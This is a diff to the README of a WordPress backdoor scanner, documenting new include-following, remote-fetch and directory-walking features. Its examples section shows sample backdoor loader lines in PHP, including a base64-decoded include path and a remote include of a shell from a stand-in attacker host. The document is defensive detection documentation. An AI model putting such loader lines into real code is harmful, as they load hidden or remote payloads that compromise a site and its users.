@@ -22,7 +22,7 @@ python wpbdscanner.py -d ./wp-content --quarantine /tmp/wp-quarantine
 | **Weighted heuristics** | Reduced inside known library paths (`/wp-includes/`, `/vendor/`, TCPDF, phpseclib, Elementor, OceanWP, …) |
 | **Selective decoding** | Prefix-decode of base64 / gzip / rot13 / hex / urldecode; re-scan for malware markers (split payloads) |
 | **PHP-in-image / EXIF** | Detects real PHP hidden in JPG/PNG/GIF/PDF (including EXIF comments); strict rules avoid binary `<?=` noise |
-| **Include chain following** | Tracks `include` / `require` / `file_get_contents` / `readfile` / `fopen` targets — including non-`.php` files and lightly encoded paths |
+| **Include chain following** | Tracks `include` / `require` / `file_get_contents` / `readfile` / `fopen` — string paths, `$var` assignments, encoded paths, and **remote http(s) URLs** (fetched & scanned) |
 | **Archive scan** | ZIP + TAR (gz/bz2/xz); inspects embedded PHP members |
 | **`.htaccess` / `.user.ini`** | `auto_prepend_file`, `AddHandler` PHP on assets, dangerous rewrites |
 | **Broad file coverage** | Rare PHP extensions, extension-less files, configs, HTML, archives |
@@ -67,6 +67,7 @@ python wpbdscanner.py --dir PATH [options]
 | `--quarantine-level` | `MEDIUM` \| `HIGH` \| `CRITICAL` (default `HIGH`) |
 | `--ignore FILE` | Path ignore patterns (see `ignore.example.txt`) |
 | `--yara FILE` | Optional YARA rules file |
+| `--no-remote` | Do not fetch http(s) include targets (still reports the URL) |
 
 ### Examples
 
@@ -90,26 +91,37 @@ python wpbdscanner.py -d ./wp-content --yara rules/example-webshells.yar
 
 ## Include / require following
 
-Many backdoors use a small loader that pulls in a payload from a non-PHP path:
+Many backdoors use a small loader that pulls in a payload from a non-PHP path, a variable, or a remote URL:
 
 ```php
 <?php
 include("../../uploads/cache/x.ico");
 file_get_contents("../../uploads/cache/shell.jpg");
-include("Li4vLi4vdXBsb2Fkcy9...");  // base64-encoded path
+include("Li4vLi4vdXBsb2Fkcy9...");     // base64-encoded path
+
+$p = "uploads/cache/x.ico";
+include($p);                             // variable include
+
+$p = base64_decode("...");
+require_once($p);                        // decoded variable
+
+include("https://evil.example/shell.txt"); // remote include
 ```
 
 The scanner:
 
 1. Parses `include`, `include_once`, `require`, `require_once`, `file_get_contents`, `readfile`, `fopen`, `file`, and similar calls
-2. Resolves relative paths under the scan root
-3. Attempts light decoding of path strings (base64, gzip+base64, hex, urldecode)
-4. Analyzes the target even when the extension is `.ico`, `.jpg`, no extension, etc.
-5. Raises the **parent** score and can list the **target** as its own finding
+2. Resolves **string literals** and **`$var`** values assigned in the same file (including `base64_decode` / `gzinflate` assignments)
+3. Decodes path strings (base64, gzip+base64, hex, urldecode, rot13)
+4. Analyzes local targets even when the extension is `.ico`, `.jpg`, no extension, hidden (`.shell`), etc.
+5. **Fetches remote http(s) URLs** (timeout/size limited) and scans the response body for shells
+6. Raises the **parent** score and can list the **target** (local or remote) as its own finding
 
-Normal core includes (`wp-load.php`, `wp-includes/`, …) are skipped to limit noise.
+Use `--no-remote` if the scan host must not make outbound HTTP requests. Remote includes are still **reported** as `[REMOTE]`; only the body fetch is skipped.
 
-**Limits:** dynamic paths like `include($var)` with no string literal, remote `http://` URLs, and heavily built paths are not fully resolved.
+Normal core path *hints* (`wp-load.php`, `wp-includes/`, …) are not treated as suspicious by themselves.
+
+**Limits:** multi-file variable plumbing, heavy runtime path builders, and authenticated remote endpoints may still need manual review.
 
 ---
 
@@ -141,7 +153,7 @@ Typical incident workflow:
 - **Always:** `.htaccess`, `.user.ini`, `wp-config.php`, …  
 - **Include targets:** files referenced by include/require/file_get_contents, even outside the usual extension list  
 
-Skipped: `.git`, `node_modules`, `.svn`, `__pycache__`, files &gt; 8 MB.
+**Nothing is skipped by path.** Every folder under `--dir` is walked — including `.git`, `node_modules`, `.svn`, `__pycache__`, and all hidden directories. Attackers can hide shells anywhere with write access. Use `--ignore` only if *you* want to exclude something. Files &gt; 8 MB are still size-skipped.
 
 ---
 
@@ -161,6 +173,7 @@ Skipped: `.git`, `node_modules`, `.svn`, `__pycache__`, files &gt; 8 MB.
 | `[DISGUISE]` | Real PHP inside image/PDF/non-PHP (incl. EXIF) |
 | `[INCLUDE]` | Suspicious include/require/file_get_contents target |
 | `[INCLUDE+DECODED]` | Decoded content from an included file |
+| `[REMOTE]` | Remote http(s) include / file_get_contents URL |
 | `[ARCHIVE]` | Bad member inside ZIP/TAR |
 | `[HTACCESS]` | Dangerous server config directive |
 | `[YARA]` | Optional YARA rule match |
@@ -223,7 +236,7 @@ Covers: classic shells, JS false-positive filter, PHP-in-JS, `.htaccess`, ZIP me
 - Premium plugins without public checksums cannot be hash-verified.  
 - RAR/7z contents need extra libraries; suspicious names still noted.  
 - Files &gt; 8 MB skipped.  
-- Dynamic includes (`include($var)`) and remote URLs are not fully followed.  
+- Complex multi-file `$var` plumbing may not resolve; remote fetch can be disabled with `--no-remote`.  
 - Runtime-only / heavily split payloads may need manual review.
 
 ---
